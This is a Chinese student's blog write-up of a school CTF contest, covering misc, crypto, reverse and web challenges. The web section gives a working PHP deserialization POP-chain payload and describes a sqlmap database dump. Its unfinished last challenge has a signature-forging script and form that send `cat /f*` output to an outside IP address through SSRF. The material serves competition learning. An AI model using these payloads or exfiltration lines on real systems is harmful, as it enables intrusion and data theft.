---
title: 校赛CTF初体验
date: '2024-5-9 22:18'
tags: CTF
description: 平平无奇的CTF咯~
abbrlink: 732c79d3
---

---

## Welcome to Eviden’s Blog:`https://www.eviden.top/`(很久没更新咯~)

---

## Misc

**emmm,之前也从来没做过misc的题,就是边学边查边做呗~**

> 你也玩拼图

脚本安装环境啥的自己具体查,py脚本小子还是有必要过这一关的!

这里给出我的示例命令,因为开始没跑出来

![](https://s1.vika.cn/space/2024/05/10/f709ebdcf6ca4d649a7b85be82651f98)

命令:https://blog.csdn.net/m0_47643893/article/details/113778577

<img src="https://s1.vika.cn/space/2024/05/10/3426c89819614f08b42c273a7f295930" style="zoom:50%;" />

自己慢慢试试偏移量应该就能解出来了~(学过移位密码的可以直接根据第一个字符得出偏移量~)

> #### 重生之我是ctf糕手

打开压缩包一顿搞,发现字体显示异常,搜索引擎开搜呗

找到一个零宽字符隐写的,ok直接找个[解密网站](http://330k.github.io/misc_tools/unicode_steganography.html)一把梭~(注:这题解密不要密码)

> #### 签到题

道具题,没啥意思,找不到工具就解不出那就搁那晾着,后面出题人给出工具了那就自行网上下载咯,拖到工具答案就出来了.工具名:SilentEye

> #### 简单加密

**开题给的提示信息就是解密密码.**

打开压缩包,看到base64然后 jpg的格式明显提示你 base64转图片.(我这种从来没写过misc的都能看出,各位大佬应该秒杀我lo~)

得到图片后,后面只要知道解密密码是开题的提示信息即可.具体细节我也记不太清了~

---

## Crypto

emmm,密码学也只是上过这门课.尽力了,能写一道就算win!

> #### Vigenère

标题就提示你了吧是什么,然后出题人还一直提示你.做过点密码学都知道,维吉尼亚密码.

ok,随便找个网站,C-V一丢,flag就出来了~

> #### 签到题

Py密码学,应该是des,这点要能判断出来,具体的加密特征和手法要了解,然后就chatgpt傻瓜式做题了~

```py


_IP = [57, 49, 41, 33, 25, 17, 9, 1,
       59, 51, 43, 35, 27, 19, 11, 3,
       61, 53, 45, 37, 29, 21, 13, 5,
       63, 55, 47, 39, 31, 23, 15, 7,
       56, 48, 40, 32, 24, 16, 8, 0,
       58, 50, 42, 34, 26, 18, 10, 2,
       60, 52, 44, 36, 28, 20, 12, 4,
       62, 54, 46, 38, 30, 22, 14, 6
       ]


def IP(plain: list[int]):
    return list(map(lambda x: plain[x], _IP))


__pc1 = [56, 48, 40, 32, 24, 16, 8,
         0, 57, 49, 41, 33, 25, 17,
         9, 1, 58, 50, 42, 34, 26,
         6, 61, 53, 45, 37, 29, 21,
         18, 10, 2, 59, 51, 43, 35,
         62, 54, 46, 38, 30, 22, 14,
         13, 5, 60, 52, 44, 36, 28,
         20, 12, 4, 27, 19, 11, 3
         ]

__pc2 = [
    13, 16, 10, 23, 0, 4,
    2, 27, 14, 5, 20, 9,
    22, 18, 11, 3, 25, 7,
    43, 48, 38, 55, 33, 52,
    15, 6, 26, 19, 12, 1,
    40, 51, 30, 36, 46, 54,
    29, 39, 50, 44, 32, 47,
    45, 41, 49, 35, 28, 31
]
ROTATIONS = [1, 1, 2, 2, 3, 2, 2, 2, 1, 2, 2, 2, 2, 2, 2, 1]


def PC_1(key: list[int]):
    return list(map(lambda x: key[x], __pc1))


def PC_2(key: list[int]):
    return list(map(lambda x: key[x], __pc2))


def get_sub_key(key: list[int]):
    key = PC_1(key)  # PC-1置换
    L, R = key[:28], key[28:]  # 分成两半

    skeys = []

    for i in range(16):
        for j in range(ROTATIONS[i]):  # 根据轮次左移
            L = L[1:] + L[:1]
            R = R[1:] + R[:1]

        skeys.append(PC_2(L + R))  # PC-2置换

    return skeys


__expansion_table = [
    31, 0, 1, 2, 3, 4,
    3, 4, 5, 6, 7, 8,
    7, 8, 9, 10, 11, 12,
    11, 12, 13, 14, 15, 16,
    15, 16, 17, 18, 19, 20,
    19, 20, 21, 22, 23, 24,
    23, 24, 25, 26, 27, 28,
    27, 28, 29, 30, 31, 0
]
__sbox = [
    # S1
    [14, 4, 13, 1, 2, 15, 11, 8, 3, 10, 6, 12, 5, 9, 0, 7,
     0, 15, 7, 4, 14, 2, 13, 1, 10, 6, 12, 11, 9, 5, 3, 8,
     4, 1, 14, 8, 13, 6, 2, 11, 15, 12, 9, 7, 3, 10, 5, 0,
     15, 12, 8, 2, 4, 9, 1, 7, 5, 11, 3, 14, 10, 0, 6, 13],

    # S2
    [15, 1, 8, 14, 6, 11, 3, 4, 9, 7, 2, 13, 12, 0, 5, 10,
     3, 13, 4, 7, 15, 2, 8, 14, 12, 0, 1, 10, 6, 9, 11, 5,
     0, 14, 7, 11, 10, 4, 13, 1, 5, 8, 12, 6, 9, 3, 2, 15,
     13, 8, 10, 1, 3, 15, 4, 2, 11, 6, 7, 12, 0, 5, 14, 9],

    # S3
    [10, 0, 9, 14, 6, 3, 15, 5, 1, 13, 12, 7, 11, 4, 2, 8,
     13, 7, 0, 9, 3, 4, 6, 10, 2, 8, 5, 14, 12, 11, 15, 1,
     13, 6, 4, 9, 8, 15, 3, 0, 11, 1, 2, 12, 5, 10, 14, 7,
     1, 10, 13, 0, 6, 9, 8, 7, 4, 15, 14, 3, 11, 5, 2, 12],

    # S4
    [7, 13, 14, 3, 0, 6, 9, 10, 1, 2, 8, 5, 11, 12, 4, 15,
     13, 8, 11, 5, 6, 15, 0, 3, 4, 7, 2, 12, 1, 10, 14, 9,
     10, 6, 9, 0, 12, 11, 7, 13, 15, 1, 3, 14, 5, 2, 8, 4,
     3, 15, 0, 6, 10, 1, 13, 8, 9, 4, 5, 11, 12, 7, 2, 14],

    # S5
    [2, 12, 4, 1, 7, 10, 11, 6, 8, 5, 3, 15, 13, 0, 14, 9,
     14, 11, 2, 12, 4, 7, 13, 1, 5, 0, 15, 10, 3, 9, 8, 6,
     4, 2, 1, 11, 10, 13, 7, 8, 15, 9, 12, 5, 6, 3, 0, 14,
     11, 8, 12, 7, 1, 14, 2, 13, 6, 15, 0, 9, 10, 4, 5, 3],

    # S6
    [12, 1, 10, 15, 9, 2, 6, 8, 0, 13, 3, 4, 14, 7, 5, 11,
     10, 15, 4, 2, 7, 12, 9, 5, 6, 1, 13, 14, 0, 11, 3, 8,
     9, 14, 15, 5, 2, 8, 12, 3, 7, 0, 4, 10, 1, 13, 11, 6,
     4, 3, 2, 12, 9, 5, 15, 10, 11, 14, 1, 7, 6, 0, 8, 13],

    # S7
    [4, 11, 2, 14, 15, 0, 8, 13, 3, 12, 9, 7, 5, 10, 6, 1,
     13, 0, 11, 7, 4, 9, 1, 10, 14, 3, 5, 12, 2, 15, 8, 6,
     1, 4, 11, 13, 12, 3, 7, 14, 10, 15, 6, 8, 0, 5, 9, 2,
     6, 11, 13, 8, 1, 4, 10, 7, 9, 5, 0, 15, 14, 2, 3, 12],

    # S8
    [13, 2, 8, 4, 6, 15, 11, 1, 10, 9, 3, 14, 5, 0, 12, 7,
     1, 15, 13, 8, 10, 3, 7, 4, 12, 5, 6, 11, 0, 14, 9, 2,
     7, 11, 4, 1, 9, 12, 14, 2, 0, 6, 10, 13, 15, 3, 5, 8,
     2, 1, 14, 7, 4, 10, 8, 13, 15, 12, 9, 0, 3, 5, 6, 11],
]
__p = [
    15, 6, 19, 20, 28, 11,
    27, 16, 0, 14, 22, 25,
    4, 17, 30, 9, 1, 7,
    23, 13, 31, 26, 2, 8,
    18, 12, 29, 5, 21, 10,
    3, 24
]


def EP(data: list[int]):  # 扩展置换
    return list(map(lambda x: data[x], __expansion_table))


def P(data: list[int]):  # P置换
    return list(map(lambda x: data[x], __p))


def F(index: int, R: list[int], skeys: list[list[int]]):
    """
    index: 代表这是第几轮
    R: 输入数据
    skeys: 子密钥数组
    """
    R = EP(R)  # 扩展置换
    R = list(map(lambda x, y: x ^ y, R, skeys[index]))  # 异或

    B = [R[:6], R[6:12], R[12:18], R[18:24], R[24:30], R[30:36], R[36:42], R[42:]]  # 分成八份

    Bn = [0] * 32
    pos = 0
    for i in range(8):
        #  计算该使用S盒的行坐标和列坐标
        row = (B[i][0] << 1) + B[i][5]
        col = (B[i][1] << 3) + (B[i][2] << 2) + (B[i][3] << 1) + B[i][4]

        sb = __sbox[i][(row << 4) + col]

        Bn[pos + 0] = (sb & 8) >> 3  # 四位输出
        Bn[pos + 1] = (sb & 4) >> 2
        Bn[pos + 2] = (sb & 2) >> 1
        Bn[pos + 3] = (sb & 1)

        pos += 4
    R = P(Bn)
    return R


_FP = [
    39, 7, 47, 15, 55, 23, 63, 31,
    38, 6, 46, 14, 54, 22, 62, 30,
    37, 5, 45, 13, 53, 21, 61, 29,
    36, 4, 44, 12, 52, 20, 60, 28,
    35, 3, 43, 11, 51, 19, 59, 27,
    34, 2, 42, 10, 50, 18, 58, 26,
    33, 1, 41, 9, 49, 17, 57, 25,
    32, 0, 40, 8, 48, 16, 56, 24
]


def FP(plain: list[int]):
    return list(map(lambda x: plain[x], _FP))


plain = b'********'
flag = b'HXCTF{%s}' % (plain)
key = b'12345678'

# 转为二进制数组
key = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in key])
plain = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in plain])
skeys = get_sub_key(key)

block = IP(plain)

L, R = block[:32], block[32:]
for i in range(16):
    tpR = R[:]
    R = F(i, R, skeys)
    R = list(map(lambda x, y: x ^ y, R, L))
    L = tpR
block = R + L
block = FP(block)
enc = bytes([int(''.join(map(str, block[i * 8:(i + 1) * 8])), 2) for i in range(8)])

print(enc)  # b'}\n<\xf5\xc8Q\x1cH'



ciphertext = b'\x12\xe9\xd2\xdf\x9bp\x1c\x99'
key = b'12345678'

# Convert key to binary array
key = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in key])

# Generate subkeys
skeys = get_sub_key(key)

# Convert ciphertext to binary array
ciphertext = reduce(add, [list(map(int, bin(i)[2:].zfill(8))) for i in ciphertext])

# Apply initial permutation
block = IP(ciphertext)

# Split block into two halves
L, R = block[:32], block[32:]

# Decrypt rounds
for i in range(16):
    tpR = R[:]
    R = F(15 - i, R, skeys)  # Note: Using subkeys in reverse order
    R = list(map(lambda x, y: x ^ y, R, L))
    L = tpR

# Swap L and R before final permutation
block = R + L

# Apply final permutation
block = FP(block)

# Convert binary array back to bytes
plaintext = bytes([int(''.join(map(str, block[i * 8:(i + 1) * 8])), 2) for i in range(8)])

print(plaintext)  # Output the decrypted plaintext

```

---

## Reverse

好了,又是个边写边学的过程~

> #### happy_assebly

```汇编
; void __cdecl enc(char *p)
.text:00401160 _enc            proc near               ; CODE XREF: _main+1B↑p
.text:00401160
.text:00401160 i               = dword ptr -4
.text:00401160 Str             = dword ptr  8
.text:00401160
.text:00401160                 push    ebp
.text:00401161                 mov     ebp, esp
.text:00401163                 push    ecx
.text:00401164                 mov     [ebp+i], 0
.text:0040116B                 jmp     short loc_401176
.text:0040116D ; ---------------------------------------------------------------------------
.text:0040116D
.text:0040116D loc_40116D:                             ; CODE XREF: _enc+3B↓j
.text:0040116D                 mov     eax, [ebp+i]
.text:00401170                 add     eax, 1
.text:00401173                 mov     [ebp+i], eax
.text:00401176
.text:00401176 loc_401176:                             ; CODE XREF: _enc+B↑j
.text:00401176                 mov     ecx, [ebp+Str]
.text:00401179                 push    ecx             ; Str
.text:0040117A                 call    _strlen
.text:0040117F                 add     esp, 4
.text:00401182                 cmp     [ebp+i], eax
.text:00401185                 jge     short loc_40119D
.text:00401187                 mov     edx, [ebp+Str]
.text:0040118A                 add     edx, [ebp+i]
.text:0040118D                 movsx   eax, byte ptr [edx]
.text:00401190                 xor     eax, 57h
.text:00401193                 mov     ecx, [ebp+Str]
.text:00401196                 add     ecx, [ebp+i]
.text:00401199                 mov     [ecx], al
.text:0040119B                 jmp     short loc_40116D
.text:0040119D ; ---------------------------------------------------------------------------
.text:0040119D
.text:0040119D loc_40119D:                             ; CODE XREF: _enc+25↑j
.text:0040119D                 mov     esp, ebp
.text:0040119F                 pop     ebp
.text:004011A0                 retn
.text:004011A0 _enc            endp
Input: your flag
Encrypted result:0x1f, 0x0f, 0x14, 0x03, 0x11, 0x2c, 0x00, 0x32, 0x3b, 0x34, 0x38, 0x3a, 0x32, 0x08, 0x23, 0x38, 0x08, 0x03, 0x3f, 0x32, 0x08, 0x16, 0x04, 0x04, 0x12, 0x1a, 0x15, 0x1b, 0x0e, 0x08, 0x00, 0x18, 0x05, 0x1b, 0x13, 0x76, 0x2a
```

看完之后也就是个异或操作,你知道这个这题就可以了.最后给了个加密的结果,那我们再逆回去就是了.直接异或操作即可

```c
void dec(char *p) {
    while (*p != '\0') {
        *p = *p ^ 0x57;
        p++;
    }
}
```

---

---



## Web

emmm,这个方向算是研究过的,终于不是陌生的了~Oh,yeah

~~只不过时间还是略显匆忙,最近事情太多了,没很多时间打这个比赛了,基本瞄一眼就过了,不会的也不想费太多时间,因为还有作业和考试,悲催~~

好波,Let’s begin!

> #### 贪吃🐍

题目给的提示;**好玩的🐍🐍，你能吃到10000分吗**

一般这种题目就是js源码分析,真要玩的10000分解出的flag那我佩服你是游戏天才(或者非人类!)

开题先别管游戏规则,老规矩F12看看先!

先f搜索一下关键词,alert,没错发现好东西了

![](https://s1.vika.cn/space/2024/05/10/fb4ca83a9a394e0cabf3c738927062f5)

再搜这个函数

![](https://s1.vika.cn/space/2024/05/10/ed4f28419de442599eeb4aedcd3d2723)

明眼人都看得出是base64吧,拿去解密即可!

OK,不到30s一血就拿下了呗

> #### sqlinject

**你能登录嘛？**

题目给的提示: ~~用sqlmap是没有灵魂的~~

纯误导提示我只能说是:当然你说反向提示你也行~

开题页面

![](https://s1.vika.cn/space/2024/05/10/9bd0b6fbea0d4ffaad98e62bd2f367c8)

就两个地方可以有机会吧.当然登陆框你可以去试试,我是用的字典跑了两轮的,应该不可能有注入点

这条路走不通那只能换另外一个news入手了

![](https://s1.vika.cn/space/2024/05/10/d1d917e835054d8389ee5ec0a2169770)

返回的是json格式,但是你仔细观察一下url,发现存在id=XXX的情况,ok,这不就是教材上经典的sql注入题型嘛.

先不急,手工验证一下,先上字典判断哪种注入类型.

![](https://s1.vika.cn/space/2024/05/10/7740300643ca4518ad3eefa4c678b070)

发现也就是很普通的sql注入类型,应该也是没有过滤的,因此直接上sqlmap就行.

接下来就是sqlmap一把梭哈了

脱库后基本的常识你要知道,这个密码一般都不是提供具体的原密码保存在服务器的,而是hash过的hash值,当然sqlmap也会提示你

以后渗透测试时不要发蒙!这个地方还原的很经典,点赞一下出题人~,当然不要轻易用sqlmap去脱库哦,可能会很刑!

![](https://s1.vika.cn/space/2024/05/10/64cd71c47d104078bb50f07b0eb2969c)

上面那个貌似是个假的库,用admin的密码登不上,反正一个个表验证就行了

最后得出是下面这个密码有效,再回到原来login页面登陆即可拿到flag!

![](https://s1.vika.cn/space/2024/05/10/fbe24020c62b42d8abecfcf2b90b1390)

> #### http

开题页面

![](https://s1.vika.cn/space/2024/05/10/2afecd31e20e45bf82fdfece3e778ae5)

经典入门改数据包,很好奇这题为啥不放第一天(sql那个题应该可以跟这个换一下的我觉得)

BP启动吧还是,实在不会你可以csdn搜一下类似的改头的手法.当然这里有个坑

第五个条件是要你改IP,一般就是XFF头就够了~

但是这里出题的恶心你一手,改XFF应该是不够的,他不会让你过

这时候需要BP的一个插件`fakeIP`[详情看](https://blog.csdn.net/weixin_44203158/article/details/107234784)

有插件应该就很好伪造了~

> #### easy_rce

开题

```php
<?php
highlight_file(__FILE__);
$code = $_GET['code'];
if(preg_match("/[A-Za-z0-9]+/",$code)){
    die("你不准玩原神");
}
@eval($code);
?>
```

emmm这好像是个原题吧,只能说一点意思没有,一模一样啥都不改

[这个blog对无字母产生讲的很清楚了,一些脚本你也可以自己编写或者思考变形,再具体的后面免杀的时候有用!](https://www.cnblogs.com/pursue-security/p/15404150.html)

异或绕过或者取反应该都行(`根据那个正则应该就是不能出现平常的字符,因此这个手法也叫无字母rce`)

具体更多的php 的一些rce手法可以看我自己的blog总结[Eviden’s Blog](https://www.eviden.top/2024/03/07/2024-03-07-RCE%E7%BB%95%E8%BF%87%E5%90%84%E7%A7%8D%E9%AA%9A/)

打不开建议用魔法访问,页面托管在国外平台,国内DNS大部分被污染了,有点慢或者无法访问都是正常~

> #### easy_pop

题目提示;简单反序列化

那就按他说的简单的反序列化来呗~

开题:

这是源码

```php
 <?php

highlight_file(__File__);

class rank1{
    public $r1a;
    public $r1b;
    public function __construct(){
        $this->r1a='aaa';
        $this->r1b='123456';
    }
    
    public function __call($a,$b){
        $this->r1a->{$this->r1b}();
        return 0;
    }
}

class rank2{
    public $r2a;
    public function __toString(){
        $this->r2a->GetFiag();
        return 0;
    }
}

class rank3{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'r3a' && $this->passwd ==='r3b'){
            include('flag.php');
            echo $flag; 
        }
    }
}

class rank4{
    public $r4a;
    public function __construct(){
        $this->r4a='hello,world';
    }
    public function __destruct(){
        echo $this->r4a;
    }
}
$pass=isset($_GET["pass"])?$_GET["pass"]:null;
if($pass!=null&&!preg_match("/\x{00}/i",$pass))
{
    unserialize($pass);
}
?> 
```

我们重点关注一些php的魔术方法:`__construct()`  `__destruct()` `__toString()` `__call($a,$b)`

就这些了,不算多~具体触发手法你去搜一下,反序列化漏洞还是很重要的!

ok,开始代码审计

我们触发的顺序就是:3<---1<---2<---4,反着推就行

```php
<?php 
//3<---1<---2<---4
class rank3{
    private $admin = 'aaa';
    protected $passwd = '123456';
	public function __construct(){
		$this->admin ='r3a';
		$this->passwd = 'r3b';
	}

}

class rank1{
	public $r1a;
    public $r1b;
	public function __construct(){
        $this->r1a=new rank3();
        $this->r1b='Getflag';
    }

}

class rank2{
	public $r2a;
	public function __construct(){
		$this->r2a = new rank1();
	}
}
class rank4{
	public $r4a;
	public function __construct(){
        $this->r4a=new rank2();
    }
}

//3<---1<---2<---4
$a=new rank4();
echo serialize( $a )."\n";
echo urlencode(serialize($a));

// %00如何绕过???
//https://wiki.wgpsec.org/knowledge/ctf/php-serialize.html

// /00->%00
// O:5:"rank4":1:{s:3:"r4a";O:5:"rank2":1:{s:3:"r2a";O:5:"rank1":2:{s:3:"r1a";O:5:"rank3":2:{S:12:"\00rank3\00admin";s:3:"r3a";S:9:"\00*\00passwd";s:3:"r3b";}s:3:"r1b";s:7:"Getflag";}}}
// https://xz.aliyun.com/t/6454?time__1311=n4%2BxnD0DRDB73RDfx05%2BbDyimC0QQDg7iABoD&alichlgref=https%3A%2F%2Fwww.google.com%2F
```

这是我按照pop链的顺序推出来EXP,改在上面,我个人喜欢用`__construct()`方法传递对象或给参数赋值,网上大部分是那个什么创建完对象后再传来传去.那个`->`看得我是又臭又长.个人爱好,勿喷

这里出题人还给了个恶心你的点`if($pass!=null&&!preg_match("/\x{00}/i",$pass))`

这个正则说人话就是匹配`%00`.

为什么会序列化后出现`%00`,这个你自己去找资料或者是学习一下反序列化漏洞入个门先,别急着就会写题

我在代码注释后面写了资料~,自己看吧!

最终Payload: 

`O:5:"rank4":1:{s:3:"r4a";O:5:"rank2":1:{s:3:"r2a";O:5:"rank1":2:{s:3:"r1a";O:5:"rank3":2:{S:12:"\00rank3\00admin";s:3:"r3a";S:9:"\00*\00passwd";s:3:"r3b";}s:3:"r1b";s:7:"Getflag";}}}`

> #### upup

~~只需要一点小小的审计，详情代码看附件噢~~

最后一题也算是我这次校赛的遗憾吧,一个是时间太紧张了,没那么多时间用来打CTF,可能也是自己代码审计这块确实low(需要补强)另一个是勾巴服务器有点问题,这个也不怪,之前就一直这种外带和反弹shell的题见的少,每次都觉得留在后面写,后面发现遇到的也多了,再慢慢学吧

源码先记录下;

```php
<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Headers: Origin, X-Requested-With, Content-Type, Accept, Authorization");
header('Access-Control-Allow-Methods: GET, POST, PUT,DELETE,OPTIONS,PATCH');

class Server{

    const DS = '/';

    protected $config = [];

    protected $runtime_path;

    /**
     * 初始化
     * @param array $config
     */
    public function __construct(array $config = [])
    {
        // 默认配置
        $default = [
            'token' => '',
            'chunks_path' => '/chunks/',
            'upload_path' => '/upload/',
            'min_file_size' => 2 * 1024 * 1024
        ];
        // 获取配置信息
        $this->config = array_merge($default,$config);

        // 运行目录
        $this->runtime_path = $this->getFitSeparator(__DIR__);

    }


    /**
     * 构建器
     * @param $config
     */
    public static function create($config){
        try {
            (new self($config))->start();
        }catch (Throwable $e){
            if($e->getCode() == 077)
                exit($e->getMessage());
            exit(json_encode(['code' => 0,'msg' => $e->getMessage()]));
        }
    }

    /**
     * 运行远程服务器
     * @throws Exception
     */
    public function start(){
        // 签名
        $sign = $_GET['sign'] ?? '';

        if(empty($sign)){
            $this->returnJson(0,'数据签名不存在');
        }

        if(!$this->sign_verify($_GET,$sign)){
            $this->returnJson(0,'数据签名验证失败');
        }
                // 上传文件
                $info = $this->upload_file($_GET['uid']);
                // 额外参数
                $info['uid'] = $_GET['uid'];
                // 回调通知
                $res = $this->upload_notify($_GET['notify'],$info);
                $this->returnJson(1,'上传文件成功');
    }


    /**
     * 上传文件到服务器
     * @param $uid
     * @return array
     * @throws Exception
     */
    protected function upload_file($uid): array
    {
        // 获取上传文件
        $file = $_FILES["file"];

        if(!$file){
            $this->returnJson(0,'请选择需要上传的文件');
        }


        // 文件后缀
        $file_ext = strtolower(pathinfo($file['name'],PATHINFO_EXTENSION));

        // 获取保存目录
        $save_dir = $this->getUserUploadPath($uid);

        // 获取保存文件夹
        $file_name = 'file_'.$this->getRandomName(16);

        // 最终保存路径
        $save_file = $this->runtime_path . $save_dir . $file_name .'.'. $file_ext;

        // 保存文件
        move_uploaded_file($file["tmp_name"], $save_file);


        if(!is_file($save_file)){
            $this->returnJson(0,'文件上传失败：Error Move Files');
        }

        $size = filesize($save_file);

        $finfo = finfo_open(FILEINFO_MIME_TYPE);
        $mime_type = finfo_file($finfo,$save_file);

        // 文件信息
        return [
            'name' => $file['name'],
            'ext' => $file_ext,
            'path' => $save_dir . $file_name .'.'. $file_ext,
            'size' => $size,
            'mime' => $mime_type
        ];

    }


    /**
     * 获取用户上传目录
     * @param $uid
     * @return array|string|string[]
     */
    protected function getUserUploadPath($uid){
        $root = $this->runtime_path;
        $path = $this->getFitSeparator($this->config['upload_path'] . date('Ymd') . self::DS . $uid . self::DS);

        $save_path = $this->getFitSeparator($root.$path);

        is_dir($save_path) || mkdir($save_path,0775,true);

        return $path;
    }

    /**
     * 获取随机文件名
     * @param int $length
     * @return string
     */
    protected function getRandomName(int $length = 16): string
    {
        $charTable = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        $result = "";
        for ( $i = 0; $i < $length; $i++ ){
            $result .= $charTable[ mt_rand(0, strlen($charTable) - 1) ];
        }
        return $result;
    }

    /**
     * 获取一致化目录分隔符
     * @param $dir
     * @param string $ds
     * @return array|string|string[]
     */
    protected function getFitSeparator($dir, string $ds = ''){
        $ds = empty($ds) ? self::DS : $ds;
        return str_replace(['\\','/','\\\\','//'],$ds,$dir);
    }


    /**
     * 返回json内容
     * @param $code
     * @param $msg
     * @param $data
     * @return void
     * @throws Exception
     */
    protected function returnJson($code, $msg, $data = null){
        $result = [
            'code' => $code,
            'msg' => $msg
        ];

        if(is_array($data)){
            $result = array_merge($result,$data);
        }else if (is_string($data)){
            $result['data'] = $data;
        }

        $json = json_encode($result);

        throw new Exception($json,077);
    }

    /**
     * 参数签名
     * @param $params
     * @return string
     */
    protected function sign_params($params): string
    {
        // 过滤参数
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // ascii排序
        ksort($params);
        reset($params);

        // 签名
        return md5(urldecode(http_build_query($params)) . $this->config['token']);
    }

    /**
     * 签名验证
     * @param $params
     * @param $sign
     * @return bool
     */
    protected function sign_verify($params,$sign): bool
    {
        return $this->sign_params($params) == $sign;
    }

    /**
     * 回调通知上传
     * @param $url
     * @param $param
     * @return bool|string
     */
    protected function upload_notify($url,$param)
    {
        // 生成签名
        $sign = $this->sign_params($param);
        $param['sign'] = $sign;

        // 请求地址
        $request_url = $url.'?'.urldecode(http_build_query($param));

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request_url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
        //利用点!
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }

}

Server::create(['token' => 'QiuQIuYyds', 'upload_path' => '/upload/']);
```

我觉得应该就是ssrf漏洞结合`curl_exec`外带,但是一直没外带成功,可能是我分析的地方有问题

Maybe外带的思路也不对?

为了伪造这个请求,首先要上传一个文件,然后服务器对签名进行校验,校验签名的机制都写在代码给你了,分析一下不难发现就是把传入的参数进行排序拼接再加个`token`拼接起来`md5`    hash一下.

伪造签名脚本

```php
?<?php
function sign_params($params): string
    {   
        $token = 'QiuQIuYyds';
        // 过滤参数
        $params = array_filter($params,function($key) use ($params){
            if(empty($params[$key]) || $key == 'sign'){
                return false;
            }
            return true;
        },ARRAY_FILTER_USE_KEY);

        // ascii排序
        ksort($params);
        reset($params);

        // 签名
        return md5(urldecode(http_build_query($params)) . $token);//绕过!
}
$params = [
    'uid' => 'index.php', // 替换为目标用户的实际 ID
    'notify' => 'http://47.236.170.130:8081/`cat /f*`', // 伪造的通知 URL
    // 'file' => 'file:///flag' // 伪造的文件路径
];

$notify='http://47.236.170.130:8081/`cat /f*`';
function upload_notify($url,$param)
    {
        // 生成签名
        //74$res = $this->upload_notify($_GET['notify'],$info);//在这执行
        $sign = sign_params($param);//观察传参行为!
        $param['sign'] = $sign;

        // 请求地址
        $request_url = $url.'?'.urldecode(http_build_query($param));
        echo $request_url;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $request_url);
        curl_setopt($ch, CURLOPT_HEADER, 0);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);

        $result = curl_exec($ch);//ssrf
        curl_close($ch);
        echo $result;
        return $result;
    }
// $token = 'QiuQIuYyds'; // 已知的 token
// $signature = md5(urldecode(http_build_query($params)) . $token);
// echo sign_params(params: $params);
upload_notify($notify,$params);
// http://121.41.53.189:36446/?uid=aa&notify=file:///flag&sign=fcfd46d234326f64bd3f9b6f97cf3748&file=file:///flag
```

伪造请求发包表单:

```html
<!DOCTYPE html>
<html>
<head>
    <title>文件上传表单</title>
</head>
<body>

<form action="http://121.41.53.189:36739/?uid=index.php&notify=http://47.236.170.130:8081/`cat /f*`&sign=c03ddc84442095751b4122a5652dbf8c" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="上传文件">
</form>

</body>
</html>
```

分析到这儿了,写作业去了(还有一堆实验报告)    ~悲~

OK,这次CTF校赛初赛就到这了ba.

正常发挥只能算是~

还要继续加油!
